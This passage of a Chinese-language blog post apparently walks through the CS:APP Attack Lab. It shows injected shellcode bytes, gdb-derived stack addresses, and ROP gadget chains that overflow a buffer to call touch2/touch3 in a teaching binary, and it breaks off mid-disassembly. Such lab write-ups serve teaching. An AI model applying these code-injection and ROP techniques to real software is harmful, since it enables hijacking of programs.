<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p2.o:     file format elf64-x86-<span class="number">64</span></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 ee <span class="number">4f</span> <span class="number">37</span> <span class="number">45</span> mov    $<span class="number">0x45374fee</span>,%rdi</span><br><span class="line">   <span class="number">7</span>:	<span class="number">68</span> <span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span>       pushq  $<span class="number">0x401860</span></span><br><span class="line">   c:	c3                   retq</span><br></pre></td></tr></table></figure>
<p>那么现在问题来了，我们要如何才能让机器开始执行这几行代码呢？简单，利用第一阶段的方式，跳转到缓冲区所在的位置即可，那么问题又来了，缓冲区的位置在哪里呢？这个就需要实际跑一次程序，用 gdb 查看了。</p>
<p>和上次的试验一样 <code>gdb ctarget</code> 开始调试，因为我想知道缓冲区从哪里开始，所以在 <code>getbuf</code> 中看看 <code>%rsp</code> 的值即可，我们在 <code>0x401828</code> 处设置断点，然后查看对应寄存器的值：</p>
<p><img src="/images/14554204273695.jpg" alt=""></p>
<p>可以看到 <code>%rsp</code> 指向的位置是 <code>0x5560f2d8</code>，这样我们就可以得到需要输入的字符串了：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 ee </span><br><span class="line"><span class="number">4f</span> <span class="number">37</span> <span class="number">45</span> <span class="number">68</span> </span><br><span class="line"><span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span></span><br><span class="line">c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">d8 f2 <span class="number">60</span> <span class="number">55</span></span><br></pre></td></tr></table></figure>
<p>然后把字符串转换成字节码：<code>./hex2raw &lt; p2.txt &gt; p2r.txt</code>，执行命令 <code>./ctarget -i p2r.txt</code> 就可以看到完成第二阶段的提示了：</p>
<p><img src="/images/14554226220350.jpg" alt=""></p>
<h2 id="u7B2C_u4E09_u9636_u6BB5"><a href="#u7B2C_u4E09_u9636_u6BB5" class="headerlink" title="第三阶段"></a>第三阶段</h2><p>这一关和之前有点类似，只是需要传入一个字符串，所涉及的函数的 C 语言代码是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到，和第二阶段的差别在于，这里会调用另一个函数来进行检验，而且传入一个字符串的话，是传入一个地址，并且字符串需要以 0 结尾（查找 ascii 码表来确定），还有一个要注意的地方是，调用 <code>hexmatch</code> 和 <code>strncmp</code> 时会把数据存入栈中，也就是会覆盖一部分 <code>getbuf</code> 的缓冲区，所以要看看到底需要把传入的字符串放到哪里。</p>
<p>这题稍微有些复杂，我们一步一步来，先把我的 cookie 转换成字符串的表达形式，也就是</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x45374fee</span> -&gt; <span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br></pre></td></tr></table></figure>
<p>因为知道在调用 <code>hexmatch</code> 的时候会覆盖缓冲区，所以需要找到一个位置来放这八个字符。光看代码比较难懂，不妨直接上手试验一下，我们需要知道的是到底覆盖了多少，所以从 <code>touch3</code> 入手:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000000040196e &#60;touch3&#62;:&#10;  40196e:&#9;53                   push   %rbx&#10;  40196f:&#9;48 89 fb             mov    %rdi,%rbx&#10;  401972:&#9;c7 05 60 3b 20 00 03 movl   $0x3,0x203b60(%rip)        # 6054dc &#60;vlevel&#62;&#10;  401979:&#9;00 00 00 &#10;  40197c:&#9;48 89 fe             mov    %rdi,%rsi&#10;  40197f:&#9;8b 3d 5f 3b 20 00    mov    0x203b5f(%rip),%edi        # 6054e4 &#60;cookie&#62;&#10;  401985:&#9;e8 36 ff ff ff       callq  4018c0 &#60;hexmatch&#62;&#10;  40198a:&#9;85 c0                test   %eax,%eax</span><br></pre></td></tr></table></figure>
<p>可以看到在 <code>0x401985</code> 的时候调用了 <code>hexmatch</code>，所以我们只要在前一句和后一句各设置一个断点，看看缓冲区有没有什么变化（这里稍微改了一下第二阶段的字节码用作测试）</p>
<p><img src="/images/before.jpg" alt="调用 hexmatch 前"></p>
<p>可以看到在调用 <code>hexmatch</code> 之前我们的缓冲区一切正常，主要留意 <code>0x5560f2f8</code> 这里，保存着我们的 cookie，其他部分其实已经执行了，所以反而无所谓。</p>
<p><img src="/images/after.jpg" alt="调用 hexmatch 后"></p>
<p>这就出问题了，我们之前存放在 <code>0x5560f2f8</code> 的传入参数给弄没了，而且可以看到从缓冲区开始 <code>0x5560f2d8</code> 到缓冲区结束 <code>0x5560f300</code> 都不安全。所以我们得给字符串找个新家，不会被覆盖的新家。</p>
<p>仔细观察 <code>0x5560f308</code> 之后的内容，在 <code>0x00401f94</code> 之后有几个空位置，刚好放得下我们的字符串。为了保证格式的一致，我们需要溢出到 <code>0x5560f318</code> 的位置（当然前一个也可以，不过我选择的位置换行了，比较容易看）</p>
<p>于是我们需要输入的字符串是</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 <span class="number">18</span> f3 <span class="number">60</span> <span class="number">55</span> <span class="number">68</span> <span class="number">6</span>e <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span> d8 f2 <span class="number">60</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">94</span> <span class="number">1f</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br></pre></td></tr></table></figure>
<p>至于这个怎么来的，其实是和第二阶段类似的过程，对应的汇编指令为：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5560f318,%rdi # mov the cookie string address to parameter&#10;push $0x40196e #push touch3 address&#10;ret</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c p3.s</span><br><span class="line">objdump <span class="operator">-d</span> p3.o &gt; p3.byte</span><br></pre></td></tr></table></figure>
<p>得到 p3.byte 文件的内容是（其实我没做这一步，直接改第二阶段的代码也可以，因为逻辑都一样的）</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">p3.o</span>: <span class="string">    file format elf64-x86-64</span></span><br><span class="line"></span><br><span class="line"><span class="cpp">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 <span class="number">18</span> f3 <span class="number">60</span> <span class="number">55</span> mov    $<span class="number">0x5560f318</span>,%rdi</span><br><span class="line">   <span class="number">7</span>:	<span class="number">68</span> <span class="number">6</span>e <span class="number">19</span> <span class="number">40</span> <span class="number">00</span>       pushq  $<span class="number">0x40196e</span></span><br><span class="line">   c:	c3                   retq</span></span><br></pre></td></tr></table></figure>
<p>然后我们就可以转换成机器码 <code>./hex2raw &lt; p3.txt &gt; p3r.txt</code> ，接着执行命令 <code>./ctarget -i p3r.txt</code> 即可看到结果：</p>
<p><img src="/images/14554578745816.jpg" alt=""></p>
<h2 id="u7B2C_u56DB_u9636_u6BB5"><a href="#u7B2C_u56DB_u9636_u6BB5" class="headerlink" title="第四阶段"></a>第四阶段</h2><p>从前面我们可以知道，有缓冲区加上缓冲区的代码可以执行使得程序非常容易被攻击，但是在 <code>rtarget</code> 中使用了两个技术来防止这种攻击：</p>
<ul>
<li>每次栈的位置是随机的，于是我们没有办法确定需要跳转的地址</li>
<li>即使我们能够找到规律注入代码，但是栈是不可执行的，一旦执行，则会遇到段错误</li>
</ul>
<p>那么现在怎么办呢？可以利用已有的可执行的代码，来完成我们的操作，称为 retrun-oriented programming(ROP)，策略就是找到现存代码中的若干条指令，这些指令后面跟着指令 <code>ret</code>，如下图所示</p>
<p><img src="/images/14554587074206.jpg" alt=""></p>
<p>每次 return 相当于从一个 gadget 跳转到另一个 gadget 中，然后通过这样不断跳转来完成我们想要的操作。举个具体的例子，假设程序中有一个像下面这样的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span>&#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这么看起来没啥用，但是看看对应的汇编代码，可能就是另一个感觉：</p>
<p><img src="/images/14554590163903.jpg" alt=""></p>
<p>这里 <code>48 89 c7</code> 就编码了 <code>movq %rax, %rdi</code> 指令（参加后面的表格），后面跟着一个 <code>c3</code>（也就是返回），于是这段代码就包含一个 gadget，起始地址是 <code>0x400f18</code>，我们就可以利用这个来做一些事情了。</p>
<p>这个阶段我们需要重复之前第二阶段的工作，但是因为程序的限制，只能另辟蹊径了，这里我们只需要利用下表给出的指令类型，以及前八个寄存器(<code>%rax - %rdi</code>)。表格如下：</p>
<p><img src="/images/14554593555844.jpg" alt=""></p>
<p><img src="/images/14554593658395.jpg" alt=""></p>
<p><img src="/images/14554593790251.jpg" alt=""></p>
<p>注意这里的内容都是 16 进制。另外两个指令是：</p>
<ul>
<li><code>ret</code>: 一个字节编码 <code>0xc3</code></li>
<li><code>nop</code>: 什么都不做，只是让程序计数器加一，一个字节编码 <code>0x90</code></li>
</ul>
<p>我们先把 <code>rtarget</code> 反编译：<code>objdump -d rtarget &gt; rtarget.txt</code> 并传到本地方便查看 <code>scp dawang@shark.ics.cs.cmu.edu:~/513/target334/rtarget.txt ./</code></p>
<p>根据前面的思路，我们大概要做的有三步：</p>
<ol>
<li>把 cookie 给搞到 <code>%rdi</code> 中</li>
<li>把 <code>touch2</code> 的地址放入栈中</li>
<li><code>rtn</code> 以开始执行</li>
</ol>
<p>后面两步不算太难，我们来看看第一步怎么搞。给我们找寻线索的函数有：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a08 &#60;start_farm&#62;:&#10;  401a08:   b8 01 00 00 00          mov    $0x1,%eax&#10;  401a0d:   c3                      retq   &#10;&#10;0000000000401a0e &#60;getval_440&#62;:&#10;  401a0e:   b8 48 88 c7 c3          mov    $0xc3c78848,%eax&#10;  401a13:   c3                      retq   &#10;&#10;0000000000401a14 &#60;addval_394&#62;:&#10;  401a14:   8d 87 58 94 90 90       lea    -0x6f6f6ba8(%rdi),%eax&#10;  401a1a:   c3                      retq   &#10;&#10;0000000000401a1b &#60;addval_304&#62;:&#10;  401a1b:   8d 87 66 58 90 c3       lea    -0x3c6fa79a(%rdi),%eax&#10;  401a21:   c3                      retq   &#10;&#10;0000000000401a22 &#60;addval_104&#62;:&#10;  401a22:   8d 87 58 c3 50 83       lea    -0x7caf3ca8(%rdi),%eax&#10;  401a28:   c3                      retq   &#10;&#10;0000000000401a29 &#60;getval_341&#62;:&#10;  401a29:   b8 5b 48 89 c7          mov    $0xc789485b,%eax&#10;  401a2e:   c3                      retq   &#10;&#10;0000000000401a2f &#60;getval_278&#62;:&#10;  401a2f:   b8 41 48 89 c7          mov    $0xc7894841,%eax&#10;  401a34:   c3                      retq   &#10;&#10;0000000000401a35 &#60;setval_371&#62;:&#10;  401a35:   c7 07 49 89 c7 c3       movl   $0xc3c78949,(%rdi)&#10;  401a3b:   c3                      retq   &#10;&#10;0000000000401a3c &#60;getval_313&#62;:&#10;  401a3c:   b8 8c fa 58 c1          mov    $0xc158fa8c,%eax&#10;  401a41:   c3                      retq   &#10;&#10;0000000000401a42 &#60;mid_farm&#62;:&#10;  401a42:   b8 01 00 00 00          mov    $0x1,%eax&#10;  401a47:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>结合上表，我们想要插入一个数字，肯定需要 <code>popq</code> 指令，对应下来就是 <code>58 - 5f</code> 这个范围，因为 ROP 的缘故，我们还需要后面有个 <code>c3</code>，经过搜索，可以看到在 <code>addval_104</code> 中，有一段 <code>58 c3</code>，也就是把栈中的值弹入到 <code>%rax</code> 中，记住这个地址 <code>0x401a24</code>。</p>
<p>现在我们要做的就是把存放在 <code>%rax</code> 的值放到 <code>%rdi</code> 中，因为这样才能当做参数传给 <code>touch2</code> 函数。根据表里的内容，继续找，这次的目标是 <code>48 89 c7</code>，也就是 <code>movq %rax, %rdi</code>，很幸运，又在 <code>getval_341</code> 中找到了，后面还正好跟了个 <code>c3</code>，赶紧记下这个地址 <code>0x401a2b</code>。</p>
<p>接下来我们就可以凑 ROP 程序了，下面是栈顶，上面是栈底。</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">0x00401860 (最后是 touch2 的入口地址，进行调用)</span><br><span class="line">-------</span></span><br><span class="line"><span class="header">0x00401a2b (把 %rax 的值放入到 %rdi 中，作为参数) -&gt; gadget 2</span><br><span class="line">-------</span></span><br><span class="line"><span class="header">0x45374fee (我的 cookie，会被 gadget 1 存入到 %rax 中)</span><br><span class="line">-------</span></span><br><span class="line"><span class="header">0x00401a24 (旧的返回地址会被这里覆盖) -&gt; gadget 1</span><br><span class="line">-------</span></span><br><span class="line"><span class="code">....</span><br><span class="line">buf (缓冲区，这里随便写点啥都可以，反正都不能执行)</span><br><span class="line">-------</span></span><br></pre></td></tr></table></figure>
<p>构造出来的字符串就是（little-endian 规则，要反着看）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">24</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> ee <span class="number">4f</span> <span class="number">37</span> <span class="number">45</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>然后转换成机器码 <code>./hex2raw &lt; p4.txt &gt; p4r.txt</code>，再执行 <code>./rtarget -i p4r.txt</code></p>
<p>但是这样居然会遇到段错误，这是我万万没想到的，问题出在哪里呢？我尝试把这四条语句拆开来执行，发现第一句和第四句没问题，但是中间两句有问题。这说明了一个问题，就是某条语句的执行依赖于后面的语句，再联想到这是 64 位的机器，就明白了为什么会出现段错误了，应该在每个语句后面补 0，那么好，修正之后的字符串是</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">24</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ee <span class="number">4f</span> <span class="number">37</span> <span class="number">45</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>再次进行测试，就可以发现任务完成：</p>
<p><img src="/images/14554791646804.jpg" alt=""></p>
<h2 id="u7B2C_u4E94_u9636_u6BB5"><a href="#u7B2C_u4E94_u9636_u6BB5" class="headerlink" title="第五阶段"></a>第五阶段</h2><p>接下来到最后一个阶段，其实做的工作是类似的，就是需要把 cookie 转换成 ascii 码通过缓冲区溢出放到栈的某个位置，然后把指向这个字符串的指针放到 <code>%rdi</code> 中，最后调用 <code>touch3</code> 即可。给出的提示是使用 <code>movl</code>（对前四位进行操作）和诸如 <code>andb %al,%al</code> 的指令（只对低2位的部分操作），标准答案中最少需要使用 8 个 gadget。</p>
<p>所以老规矩，先把 cookie 转换成 ascii 码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x45374fee</span> -&gt; <span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br></pre></td></tr></table></figure>
<p>然后我们有完整的用来寻找 gadget 的函数库</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a08 &#60;start_farm&#62;:&#10;  401a08: b8 01 00 00 00        mov    $0x1,%eax&#10;  401a0d: c3                    retq   &#10;&#10;0000000000401a0e &#60;getval_440&#62;:&#10;  401a0e: b8 48 88 c7 c3        mov    $0xc3c78848,%eax&#10;  401a13: c3                    retq   &#10;&#10;0000000000401a14 &#60;addval_394&#62;:&#10;  401a14: 8d 87 58 94 90 90     lea    -0x6f6f6ba8(%rdi),%eax&#10;  401a1a: c3                    retq   &#10;&#10;0000000000401a1b &#60;addval_304&#62;:&#10;  401a1b: 8d 87 66 58 90 c3     lea    -0x3c6fa79a(%rdi),%eax&#10;  401a21: c3                    retq   &#10;&#10;0000000000401a22 &#60;addval_104&#62;:&#10;  401a22: 8d 87 58 c3 50 83     lea    -0x7caf3ca8(%rdi),%eax&#10;  401a28: c3                    retq   &#10;&#10;0000000000401a29 &#60;getval_341&#62;:&#10;  401a29: b8 5b 48 89 c7        mov    $0xc789485b,%eax&#10;  401a2e: c3                    retq   &#10;&#10;0000000000401a2f &#60;getval_278&#62;:&#10;  401a2f: b8 41 48 89 c7        mov    $0xc7894841,%eax&#10;  401a34: c3                    retq   &#10;&#10;0000000000401a35 &#60;setval_371&#62;:&#10;  401a35: c7 07 49 89 c7 c3     movl   $0xc3c78949,(%rdi)&#10;  401a3b: c3                    retq   &#10;&#10;0000000000401a3c &#60;getval_313&#62;:&#10;  401a3c: b8 8c fa 58 c1        mov    $0xc158fa8c,%eax&#10;  401a41: c3                    retq   &#10;&#10;0000000000401a42 &#60;mid_farm&#62;:&#10;  401a42: b8 01 00 00 00        mov    $0x1,%eax&#10;  401a47: c3                    retq   &#10;&#10;0000000000401a48 &#60;add_xy&#62;:&#10;  401a48: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax&#10;  401a4c: c3                    retq   &#10;&#10;0000000000401a4d &#60;getval_349&#62;:&#10;  401a4d: b8 89 c1 18 c0        mov    $0xc018c189,%eax&#10;  401a52: c3                    retq   &#10;&#10;0000000000401a53 &#60;addval_166&#62;:&#10;  401a53: 8d 87 48 89 e0 c3     lea    -0x3c1f76b8(%rdi),%eax&#10;  401a59: c3                    retq   &#10;&#10;0000000000401a5a &#60;getval_106&#62;:&#10;  401a5a: b8 89 ca 91 c3        mov    $0xc391ca89,%eax&#10;  401a5f: c3                    retq   &#10;&#10;0000000000401a60 &#60;getval_330&#62;:&#10;  401a60: b8 89 ca a4 db        mov    $0xdba4ca89,%eax&#10;  401a65: c3                    retq   &#10;&#10;0000000000401a66 &#60;addval_260&#62;:&#10;  401a66: 8d 87 89 d6 38 c0     lea    -0x3fc72977(%rdi),%eax&#10;  401a6c: c3                    retq   &#10;&#10;0000000000401a6d &#60;addval_114&#62;:&#10;  401a6d: 8d 87 8d d6 90 90     lea    -0x6f6f2973(%rdi),%eax&#10;  401a73: c3                    retq   &#10;&#10;0000000000401a74 &#60;setval_481&#62;:&#10;  401a74: c7 07 8d c1 90 c3     movl   $0xc390c18d,(%rdi)&#10;  401a7a: c3                    retq   &#10;&#10;0000000000401a7b &#60;setval_470&#62;:&#10;  401a7b: c7 07 89 d6 92 90     movl   $0x9092d689,(%rdi)&#10;  401a81: c3                    retq   &#10;&#10;0000000000401a82 &#60;getval_418&#62;:&#10;  401a82: b8 8a 48 99 e0        mov    $0xe099488a,%eax&#10;  401a87: c3                    retq   &#10;&#10;0000000000401a88 &#60;setval_253&#62;:&#10;  401a88: c7 07 89 d6 08 c9     movl   $0xc908d689,(%rdi)&#10;  401a8e: c3                    retq   &#10;&#10;0000000000401a8f &#60;setval_227&#62;:&#10;  401a8f: c7 07 8b c1 20 db     movl   $0xdb20c18b,(%rdi)&#10;  401a95: c3                    retq   &#10;&#10;0000000000401a96 &#60;setval_110&#62;:&#10;  401a96: c7 07 89 c1 20 c9     movl   $0xc920c189,(%rdi)&#10;  401a9c: c3                    retq   &#10;&#10;0000000000401a9d &#60;setval_309&#62;:&#10;  401a9d: c7 07 d8 4c 89 e0     movl   $0xe0894cd8,(%rdi)&#10;  401aa3: c3                    retq   &#10;&#10;0000000000401aa4 &#60;getval_136&#62;:&#10;  401aa4: b8 89 c1 91 c3        mov    $0xc391c189,%eax&#10;  401aa9: c3                    retq   &#10;&#10;0000000000401aaa &#60;setval_319&#62;:&#10;  401aaa: c7 07 89 d6 91 c3     movl   $0xc391d689,(%rdi)&#10;  401ab0: c3                    retq   &#10;&#10;0000000000401ab1 &#60;addval_193&#62;:&#10;  401ab1: 8d 87 a9 ca 90 c3     lea    -0x3c6f3557(%rdi),%eax&#10;  401ab7: c3                    retq   &#10;&#10;0000000000401ab8 &#60;addval_471&#62;:&#10;  401ab8: 8d 87 89 ca c4 c9     lea    -0x363b3577(%rdi),%eax&#10;  401abe: c3                    retq   &#10;&#10;0000000000401abf &#60;setval_289&#62;:&#10;  401abf: c7 07 89 ca 48 db     movl   $0xdb48ca89,(%rdi)&#10;  401ac5: c3                    retq   &#10;&#10;0000000000401ac6 &#60;addval_482&#62;:&#10;  401ac6: 8d 87 89 ca 38 c0     lea    -0x3fc73577(%rdi),%eax&#10;  401acc: c3                    retq   &#10;&#10;0000000000401acd &#60;addval_125&#62;:&#10;  401acd: 8d 87 08 89 e0 c3     lea    -0x3c1f76f8(%rdi),%eax&#10;  401ad3: c3                    retq   &#10;&#10;0000000000401ad4 &#60;getval_332&#62;:&#10;  401ad4: b8 09 c1 90 c3        mov    $0xc390c109,%eax&#10;  401ad9: c3                    retq   &#10;&#10;0000000000401ada &#60;addval_385&#62;:&#10;  401ada: 8d 87 48 8b e0 90     lea    -0x6f1f74b8(%rdi),%eax&#10;  401ae0: c3                    retq   &#10;&#10;0000000000401ae1 &#60;setval_263&#62;:&#10;  401ae1: c7 07 4c 89 e0 90     movl   $0x90e0894c,(%rdi)&#10;  401ae7: c3                    retq   &#10;&#10;0000000000401ae8 &#60;getval_187&#62;:&#10;  401ae8: b8 4b 89 d6 c1        mov    $0xc1d6894b,%eax&#10;  401aed: c3                    retq   &#10;&#10;0000000000401aee &#60;addval_462&#62;:&#10;  401aee: 8d 87 89 ca c4 d2     lea    -0x2d3b3577(%rdi),%eax&#10;  401af4: c3                    retq   &#10;&#10;0000000000401af5 &#60;getval_109&#62;:&#10;  401af5: b8 c9 c1 90 c3        mov    